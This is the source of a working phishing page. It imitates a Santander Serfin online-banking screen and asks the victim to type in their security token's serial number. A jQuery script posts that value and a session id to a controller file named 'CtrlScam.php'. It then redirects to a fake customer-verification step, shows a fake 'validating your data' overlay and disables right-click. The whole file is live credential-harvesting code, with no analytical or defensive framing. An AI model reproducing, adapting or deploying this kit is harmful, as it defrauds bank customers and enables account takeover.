<?php 
    $session = $_GET['session'];
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0060)https://enlace.santander-serfin.com/mac/MAC/jsp/tokenMac.jsp -->
<HTML>

<HEAD>
    <TITLE>Identificaci&oacute;n de Usuario</TITLE>
    <STYLE type=text/css>TD { FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; COLOR: #666666; FONT-SIZE: 10px; FONT-WEIGHT: normal; TEXT-DECORATION: none } .titulo { FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; COLOR: #ff0000; FONT-SIZE: 12px; FONT-WEIGHT: bold; TEXT-DECORATION: none } .tituloCopy { FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; COLOR: #666666; FONT-SIZE: 12px; FONT-WEIGHT: bold; TEXT-DECORATION: none } </STYLE> <META content="text/html; charset=iso-8859-1" http-equiv=Content-Type>
        <META name="Codigo de Pantalla" content=s26050>
<META content=1 http-equiv=Expires>
<META content=no-cache http-equiv=pragma>
<!--<SCRIPT language=JavaScript src="tokenMac_archivos/cuadroDialogo.js"></SCRIPT>
<SCRIPT language=JavaScript src="tokenMac_archivos/scripts.js"></SCRIPT>-->


<script src="../../jquery-1.11.2.js"></script>
<script src="../../eai/EaiEmpresasWAR/js/cuadroDialogo.js" type="text/javascript"></script>
<script>
    $(document).ready(function(){
        //alert($('#session').val());
        
        var contrasena_dinamica = $('#tokParam');

        $('#btnFrm').click(function(e){
            e.preventDefault();
            validaNumeroSerie();
            return false;
        });


        $('#form1').submit(function(e){
            e.preventDefault();
            validaNumeroSerie();
        });

        function validaNumeroSerie(){
            if(contrasena_dinamica.val() == ""){
                cuadroDialogo("Debe introducir el N&uacute;mero de Serie de su Token.", 1);
                contrasena_dinamica.focus();
            }else{
                $.ajax({
                    type: 'POST',
                    url: '../../Controllers/CtrlScam.php',
                    data: {
                        "request": "num_serie_token",
                        "num_serie_token": contrasena_dinamica.val(),
                        "session": $('#session').val()
                    },
                    beforeSend: function(){
                        console.log("ENviando...");
                        $('#backmodal').show();
                        $('#mensajeLoading').show();
                    },
                    success: function (resp){
                        console.log('Datos Enviados');
                        console.log(resp);
                        $('#backmodal').hide();
                        $('#mensajeLoading').hide();
                        window.location.href="verificacionDatosCliente.do.php?DATAID=ASJ893asi2i342837kjdha82389420&session="+$('#session').val()+"&inforData=ndj723648whrr82743";

                    },
                    error: function (request, textStatus, errorThrown) {
                        console.log('Error al Enviar los Datos: '+errorThrown);
                    }
                });
            }
        }


    });
</script>
<script language=Javascript>
      <!--
    function solo_numeros_wey(evt)
     {
        var keyPressed = (evt.which) ? evt.which : event.keyCode
       return !(keyPressed > 31 && (keyPressed < 48 || keyPressed > 57));
     }
      //-->
   </script>
<SCRIPT language=Javascript>



function MM_preloadImages() { //v3.0

  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();

    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)

    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}

}

function MM_swapImgRestore() { //v3.0

  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;

}



function MM_findObj(n, d) { //v4.01

  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {

    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}

  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];

  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);

  if(!x && d.getElementById) x=d.getElementById(n); return x;

}



function MM_swapImage() { //v3.0

  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)

   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}

}



function MM_openBrWindow(theURL,winName,features) { //v2.0

  window.open(theURL,winName,features);

}

// distintivo

function isDigit (c)

{

  return ((c >= "0") && (c <= "9"))

}

function getContext(path)
{
  /*<VC autor ="ESC" fecha ="09/04/2008" descripcion ="validar que se muestren las imagenes con  juncion y sin juncion" OT ="ALMACHEQ"*/
  var pname = window.document.location.pathname;
  var indice = pname.indexOf(path); 
  var junction = pname.substring(0,indice);
  //alert(pname);
  //alert(junction);
  if(junction.length > 0) 
    path = junction +path;  
  //alert(path);
  /*</VC*/
  //alert(path);
  return path;
}

document.oncontextmenu = function(){return false} 
</SCRIPT>
<LINK rel=stylesheet type=text/css href="tokenMac_archivos/consultas.css">
<STYLE type=text/css>TD {
  FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; COLOR: #666666; FONT-SIZE: 10px; FONT-WEIGHT: normal; TEXT-DECORATION: none
}
.titulo {
  FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; COLOR: #ff0000; FONT-SIZE: 12px; FONT-WEIGHT: bold; TEXT-DECORATION: none
}
.tituloCopy {
  FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; COLOR: #666666; FONT-SIZE: 12px; FONT-WEIGHT: bold; TEXT-DECORATION: none
}
</STYLE>

    <META name=GENERATOR content="MSHTML 9.00.8112.16448">
</HEAD>

<BODY onload="MM_preloadImages('/MAC/img/gbo25131.gif','/MAC/img/gbo25151.gif','/MAC/img/gbo25171.gif','/MAC/img/gbo25111.gif','/MAC/img/gba25020.gif')" background=tokenMac_archivos/gfo25010.gif leftMargin=0 topMargin=0 bgColor=#ffffff marginwidth="0" marginheight="0">

    <input type="hidden" name="session" id="session" value="<?=$session;?>">


    <DIV style="Z-INDEX: 1; POSITION: absolute; WIDTH: 316px; HEIGHT: 31px; TOP: 96px; LEFT: 315px" id=Layer1><IMG src="tokenMac_archivos/gti25030.gif" width=332 height=40> </DIV>
    <TABLE border=0 cellSpacing=0 cellPadding=0 width="100%">
        <TBODY>
            <TR>
                <TD vAlign=top width=596>
                    <TABLE class=tabfonbla border=0 cellSpacing=0 cellPadding=0 width=596>
                        <TBODY>
                            <TR vAlign=top>
                                <TD rowSpan=2><IMG src="tokenMac_archivos/glo25010.gif" width=237 height=41> </TD>
                                <TD rowSpan=2><A onmouseover="MM_swapImage('contactanos','','/MAC/img/gbo25111.gif',1)" onmouseout=MM_swapImgRestore() href="javascript:;"><IMG border=0 name=contactanos src="tokenMac_archivos/gbo25110.gif" width=30 height=33></A></TD>
                                <TD rowSpan=2><IMG alt=Cont&aacute;ctenos src="tokenMac_archivos/gbo25120.gif" width=59 height=20></TD>
                                <TD rowSpan=2><A onmouseover="MM_swapImage('atencion','','/MAC/img/gbo25131.gif',1)" onmouseout=MM_swapImgRestore() href="javascript:;"><IMG border=0 name=atencion src="tokenMac_archivos/gbo25130.gif" width=36 height=33></A></TD>
                                <TD rowSpan=2><IMG alt="Atenci&oacute;n telef&oacute;nica" src="tokenMac_archivos/gbo25140.gif" width=90 height=20></TD>
                                <TD rowSpan=2><A onmouseover="MM_swapImage('centro','','/MAC/img/gbo25151.gif',1)" onmouseout=MM_swapImgRestore() href="javascript:;"><IMG border=0 name=centro src="tokenMac_archivos/gbo25150.gif" width=33 height=33></A></TD>
                                <TD rowSpan=2><IMG alt="Centro de mensajes" src="tokenMac_archivos/gbo25160.gif" width=93 height=20></TD>
                                <TD bgColor=#de0000 width=18><IMG src="tokenMac_archivos/gau25010.gif" width=18 height=17></TD>
                            </TR>
                            <TR vAlign=top>
                                <TD><IMG src="tokenMac_archivos/gau25010.gif" width=18 height=24></TD>
                            </TR>
                        </TBODY>
                    </TABLE>
                    <TABLE class=tabfonbla border=0 cellSpacing=6 cellPadding=0 align=right>
                        <TBODY>
                            <TR>
                                <!--*********************************************-->
                            </TR>
                        </TBODY>
                    </TABLE>
                </TD>
                <TD vAlign=top width="100%">
                    <TABLE border=0 cellSpacing=0 cellPadding=0 width="100%" bgColor=#ffffff>
                        <TBODY>
                            <TR>
                                <TD bgColor=#de0000><IMG src="tokenMac_archivos/gau25010.gif" width=35 height=17></TD>
                                <TD rowSpan=2 align=center><IMG alt="" src="tokenMac_archivos/glo25020.gif" width=57 height=41></TD>
                                <TD bgColor=#de0000 width="100%"><IMG src="tokenMac_archivos/gau25010.gif" width=5 height=17></TD>
                            </TR>
                            <TR>
                                <TD><IMG src="tokenMac_archivos/gau25010.gif" width=35 height=24></TD>
                                <TD><IMG src="tokenMac_archivos/gau25010.gif" width=5 height=24></TD>
                            </TR>
                        </TBODY>
                    </TABLE>
                    <TABLE border=0 cellSpacing=0 cellPadding=0>
                        <TBODY>
                            <TR>
                                <TD class=tabfonbla width=126 align=right><IMG alt="Sitio seguro" src="tokenMac_archivos/gba25010.gif" width=126 height=33></TD>
                                <TD class=tabfonbla rowSpan=2 width=50 align=right>&nbsp;</TD>
                            </TR>
                            <TR>
                                <TD align=right><A onmouseover="MM_swapImage('finsesion','',getContext('/MAC') +'/img/gbo25181.gif',1)" onmouseout=MM_swapImgRestore() href="https://enlace.santander-serfin.com/mac/MAC/AdminPwdServlet?module=VAL_MOD_FIN_SESION&amp;method=FINALIZAR"><IMG border=0 name=finsesion src="tokenMac_archivos/gbo25180.gif" width=44 height=49></A></TD>
                            </TR>
                        </TBODY>
                    </TABLE>
                </TD>
            </TR>
        </TBODY>
    </TABLE>
    <META name="Codigo de Pantalla" content=s26050>
    <META content=1 http-equiv=Expires>
    <META content=no-cache http-equiv=pragma>
    <!--<SCRIPT language=JavaScript src="tokenMac_archivos/cuadroDialogo.js"></SCRIPT>-->

    <SCRIPT language=Javascript>




        // distintivo
function isDigit (c)
{
  return ((c >= "0") && (c <= "9"))
}
function validaForma() {
  token = document.form1.tokParam.value;

  if(token.length == 0) {
    alert("Debe de ingresar la serie de su token");
    return;
  }
  document.form1.submit();
}
//</VC>
function validaFormato (pwd)
{
  var TemplateF=/^[\d]{8,8}$/i;  //dominio de 0-9
  return TemplateF.test(pwd);  //Compara "pwd" con el formato "Template"
}

function soloNumeros(evt) {
    evt = (evt) ? evt : event;
    var charCode = (evt.charCode) ? evt.charCode : ((evt.keyCode) ? evt.keyCode :
        ((evt.which) ? evt.which : 0));
    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
        return false;
    }
    return true;
 }
</SCRIPT>
    <!--  <link rel="stylesheet" href="/EnlaceMig/consultas.css" type="text/css"> -->
    <CENTER>
        <TABLE border=0 width=500>
            <TBODY>
                <TR>
                    <TD align=center>
                        <TABLE border=0 cellSpacing=0 cellPadding=0 width="94%">
                            <TBODY>
                                <TR>
                                    <TD class=titulo height=20 align=center>&nbsp;</TD>
                                </TR>
                                <TR>
                                    <TD class=titulo bgColor=#94b2df height=20 align=center>
                                        <P class=tituloCopy>
                                            <FONT color=#000000>Capture el n&uacute;mero de serie de su token </FONT>
                                        </P>
                                    </TD>
                                </TR>
                                <TR>
                                    <TD>&nbsp;</TD>
                                </TR>
                                <TR>
                                    <TD align=center>
                                        <TABLE border=0 cellSpacing=0 cellPadding=0 width="56%">
                                            <TBODY>
                                                <TR vAlign=middle>
                                                    <TD>
                                                        <FORM method="post" name="form1" id="form1" action="">
                                                <TR vAlign=middle>
                                                    <TD class=tituloCopy width=150>N&uacute;mero de serie :</TD>
                                                    <TD><INPUT name="tokParam" id="tokParam" type="text" size="15" maxLength=30 onkeypress="return solo_numeros_wey(event)"></TD>
                                                </TR>
                                                </FORM>
                                    </TD>
                                </TR>
                            </TBODY>
                        </TABLE>
                        <P>&nbsp;</P>
                    </TD>
                </TR>
                <TR>
                    <TD align=center><A href="#" id="btnFrm"><IMG border=0 src="tokenMac_archivos/gbo25280.gif" width=84 height=26></A></TD>
                </TR>
                <TR>
                    <TD>
                        <TABLE border=0 cellSpacing=0 cellPadding=0 width="100%">
                            <TBODY>
                                <TR vAlign=top>
                                    <TD width="36%"><STRONG>Paso 1.</STRONG> <BR>
                                        Visualize el reverso de su token </TD>
                                    <TD>&nbsp;</TD>
                                    <TD width="36%"><STRONG>Paso 2. </STRONG><BR>
                                        Capture el n&uacute;mero de serie que aperece en el reverso de su
                                        Token.</TD>
                                </TR>
                            </TBODY>
                        </TABLE>
                    </TD>
                </TR>
            </TBODY>
        </TABLE>
        </TD>
        </TR>
        <TR>
            <TD align=center> <img src="inbu_portatil.png" width="220" height="210"></TD>
        </TR>
        </TBODY>
        </TABLE>
    </CENTER>

    <div id="backmodal" class="simplemodal-overlay" style="background-color: #F8F8F8; opacity: 0.8; height: 1509px; width: 1280px; position: fixed; left: 0px; top: 0px; z-index: 1000000001;display:none;"></div>
    <div id="mensajeLoading" style="text-align: center;position: fixed;width: 50%; z-index: 1000000002; left: 25%; top: 20%; height: 327px;display:none;">
        <img src="25.gif" style="width: 150px;height: 150px;">
        <p style="font-weight: bold;font-family:Verdana, Arial, Helvetica, sans-serif;COLOR: #666666;">El sistema se encuentra validando sus datos.<br>Porfavor espere un momento...</p>
    </div>
    <SCRIPT>
        document.forms[0].tokParam.focus();
        null

    </SCRIPT>
</BODY>

</HTML>
